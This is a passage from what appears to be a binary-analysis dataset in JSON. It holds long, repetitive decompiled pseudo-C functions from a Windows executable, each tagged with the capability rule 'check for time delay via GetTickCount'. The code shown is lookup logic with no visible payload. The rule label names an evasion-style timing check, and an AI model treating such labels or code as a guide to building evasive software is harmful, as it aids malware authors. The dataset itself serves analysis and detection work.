{\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb440);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401055f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106020, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106060, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106100, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106120, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106140, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106160, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106180, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar2 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106480, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar2, iVar4, arg3);\n        return piVar2;\n    }\n    iVar4 = *(*piVar2 + -0x18) + piVar2;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar2;\n}\n",
        "token_count": 7041
    },
    "1400b346": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3460(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb3f0);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401054d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb400);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb410);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb420);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb430);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401055d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb440);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401055f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106020, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106060, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106100, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106120, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106140, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106160, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106180, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 4532
    },
    "1400b34c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b34c0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb400);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb410);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb420);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb430);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401055d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb440);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401055f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106020, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106060, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106100, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106120, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106140, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106160, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106180, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        